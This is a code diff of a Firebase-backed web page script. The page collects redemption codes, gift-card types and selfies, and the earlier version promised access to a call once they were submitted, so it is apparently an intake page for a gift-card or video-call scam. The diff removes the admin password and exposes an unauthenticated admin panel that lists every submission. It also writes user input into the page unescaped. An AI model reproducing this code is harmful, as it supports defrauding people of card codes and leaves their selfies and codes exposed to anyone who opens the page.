@@ -282,167 +282,125 @@
   </div>
 
 <script type="module">
-  // Import Firebase v9 SDK
   import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
   import { 
-    getFirestore, collection, addDoc, serverTimestamp, 
-    query, orderBy, onSnapshot 
+    getFirestore, collection, addDoc, serverTimestamp, query, orderBy, onSnapshot 
   } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
   import { 
     getStorage, ref, uploadBytes, getDownloadURL 
   } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-storage.js";
 
-  // Firebase configuration
+  // 🔹 Your Firebase config (online one)
   const firebaseConfig = {
     apiKey: "AIzaSyBUmxEQRSirDF_hc3rvgzwU5vRc5uVifcY",
     authDomain: "video-call-auth-e2237.firebaseapp.com",
     projectId: "video-call-auth-e2237",
-    storageBucket: "video-call-auth-e2237.appspot.com",   // ✅ fixed
+    storageBucket: "video-call-auth-e2237.appspot.com",
     messagingSenderId: "203016834335",
     appId: "1:203016834335:web:fddc9c06f433a64afcf42a",
     measurementId: "G-05HNPKVC14"
   };
 
-  // Initialize Firebase
+  // 🔹 Initialize Firebase
   const app = initializeApp(firebaseConfig);
   const db = getFirestore(app);
   const storage = getStorage(app);
 
-  const ADMIN_PASSWORD = "admin123"; // Change this for security
+  const submissionsCollection = collection(db, "submissions");
 
-  // ------------------ Submit Files ------------------
-  async function submitFiles() {
+  // ==========================================================
+  // 🔹 Handle Submission
+  // ==========================================================
+  document.getElementById("submitBtn").addEventListener("click", async () => {
+    const code = document.getElementById("redemptionCode").value.trim();
     const selfie = document.getElementById("selfie").files[0];
-    const redemptionCode = document.getElementById("redemptionCode").value.trim();
-    const selectedCards = Array.from(
-      document.querySelectorAll('input[name="cardType"]:checked')
-    ).map(cb => cb.value);
 
-    if (!selfie) return showStatus("Please upload a selfie before submitting.", "error");
-    if (!redemptionCode) return showStatus("Please enter your redemption code.", "error");
-    if (selectedCards.length === 0) return showStatus("Please select at least one redemption method.", "error");
+    // get selected card type (checkbox)
+    const cardTypeCheckbox = document.querySelector("input[name='cardType']:checked");
+    const cardType = cardTypeCheckbox ? cardTypeCheckbox.value : "N/A";
 
-    document.getElementById("loading").style.display = "block";
-    document.getElementById("submitBtn").disabled = true;
+    if (!code || !selfie) {
+      alert("Please enter code and upload selfie.");
+      return;
+    }
 
     try {
-      // Upload selfie
-      const selfieRef = ref(storage, `selfies/${Date.now()}_${selfie.name}`);
-      await uploadBytes(selfieRef, selfie);
-      const downloadURL = await getDownloadURL(selfieRef);
+      console.log("📤 Uploading selfie...");
+      const storageRef = ref(storage, "selfies/" + Date.now() + "_" + selfie.name);
+      await uploadBytes(storageRef, selfie);
+      const selfieURL = await getDownloadURL(storageRef);
 
-      // Save Firestore document
-      const submission = {
-        selfieURL: downloadURL,
-        redemptionCode,
-        cardTypes: selectedCards,
-        time: new Date().toLocaleString(),
-        timestamp: serverTimestamp()
-      };
-      const docRef = await addDoc(collection(db, "submissions"), submission);
+      console.log("📝 Saving to Firestore...");
+      await addDoc(submissionsCollection, {
+        redemptionCode: code,
+        cardType: cardType,
+        selfieURL: selfieURL,
+        timestamp: serverTimestamp(),
+        time: new Date().toLocaleString()
+      });
 
-      showStatus("Submission successful! You can now join the call.", "success");
-      console.log("✅ Document written with ID:", docRef.id);
-
+      alert("✅ Submission successful!");
     } catch (error) {
-      console.error("❌ Error details:", error);
-
-      // Save Firestore fallback (no image)
-      try {
-        const submission = {
-          redemptionCode,
-          cardTypes: selectedCards,
-          time: new Date().toLocaleString(),
-          timestamp: serverTimestamp(),
-          error: "Image upload failed, but data was saved"
-        };
-        await addDoc(collection(db, "submissions"), submission);
-        showStatus("Data saved (image upload failed). You can now join the call.", "success");
-      } catch (dbError) {
-        showStatus(`Error: ${dbError.message}`, "error");
-        console.error("Error adding document: ", dbError);
-      }
+      console.error("❌ Error adding submission:", error);
+      alert("Error: " + error.message);
     } finally {
-      document.getElementById("loading").style.display = "none";
-      document.getElementById("submitBtn").disabled = false;
+      // Reset form so it works again
+      document.getElementById("redemptionCode").value = "";
+      document.getElementById("selfie").value = "";
+      document.querySelectorAll('input[name="cardType"]').forEach(cb => cb.checked = false);
     }
-  }
+  });
 
-  // ------------------ Admin Access ------------------
-  function requestAdminAccess() {
-    const pass = prompt("Enter admin password:");
-    if (pass === ADMIN_PASSWORD) {
-      openAdmin();
-    } else {
-      alert("Access Denied!");
-    }
-  }
+  // ==========================================================
+  // 🔹 Admin Panel
+  // ==========================================================
+  let unsubscribeAdmin = null;
 
-  function openAdmin() {
+  window.openAdmin = function() {
     const panel = document.getElementById("adminPanel");
     const list = document.getElementById("submissionsList");
     list.innerHTML = "";
 
+    // remove previous listener
+    if (unsubscribeAdmin) unsubscribeAdmin();
+
     try {
       const q = query(collection(db, "submissions"), orderBy("timestamp", "desc"));
-
-      // Real-time listener 🔥
-      onSnapshot(q, (snapshot) => {
+      unsubscribeAdmin = onSnapshot(q, (snapshot) => {
         list.innerHTML = "";
         if (snapshot.empty) {
           list.innerHTML = "<p>No submissions found.</p>";
           return;
         }
-
         snapshot.forEach((doc) => {
-          const data = doc.data();
+          const d = doc.data();
           list.innerHTML += `
             <div class="submission">
               <p><b>Submission ID:</b> ${doc.id}</p>
-              <p><b>Time:</b> ${data.time}</p>
-              <p><b>Redemption Code:</b> ${data.redemptionCode || 'N/A'}</p>
-              <p><b>Card Types:</b> ${data.cardTypes ? data.cardTypes.join(", ") : 'N/A'}</p>
-              ${data.selfieURL ? `<img src="${data.selfieURL}" alt="Selfie">` : '<p>No image available</p>'}
-              ${data.error ? `<p class="error">Error: ${data.error}</p>` : ''}
+              <p><b>Time:</b> ${d.time || ""}</p>
+              <p><b>Redemption Code:</b> ${d.redemptionCode || "N/A"}</p>
+              <p><b>Card Type:</b> ${d.cardType || "N/A"}</p>
+              ${d.selfieURL ? `<img src="${d.selfieURL}" alt="Selfie" width="150">` : "<p>No image</p>"}
+              ${d.error ? `<p class="error">Error: ${d.error}</p>` : ""}
             </div>
           `;
         });
+      }, (err) => {
+        console.error("❌ onSnapshot error:", err);
+        list.innerHTML = `<p>Error loading data: ${err.message}</p>`;
       });
     } catch (error) {
+      console.error("❌ openAdmin error:", error);
       list.innerHTML = `<p>Error loading data: ${error.message}</p>`;
     }
 
     panel.style.display = "block";
-  }
+  };
 
-  function closeAdmin() {
+  window.closeAdmin = function() {
+    if (unsubscribeAdmin) unsubscribeAdmin(); // stop listener
     document.getElementById("adminPanel").style.display = "none";
-  }
-
-  // ------------------ Helpers ------------------
-  function showStatus(message, type) {
-    const statusEl = document.getElementById("statusMessage");
-    statusEl.textContent = message;
-    statusEl.className = `status-message ${type}`;
-    statusEl.style.display = "block";
-    setTimeout(() => { statusEl.style.display = "none"; }, 5000);
-  }
-
-  // Only allow one card type at a time
-  document.querySelectorAll('input[name="cardType"]').forEach(checkbox => {
-    checkbox.addEventListener('change', function () {
-      if (this.checked) {
-        document.querySelectorAll('input[name="cardType"]').forEach(other => {
-          if (other !== this) other.checked = false;
-        });
-      }
-    });
-  });
-
-  // Expose functions globally for HTML buttons
-  window.submitFiles = submitFiles;
-  window.requestAdminAccess = requestAdminAccess;
-  window.closeAdmin = closeAdmin;
+  };
 </script>
 </body>
 </html>
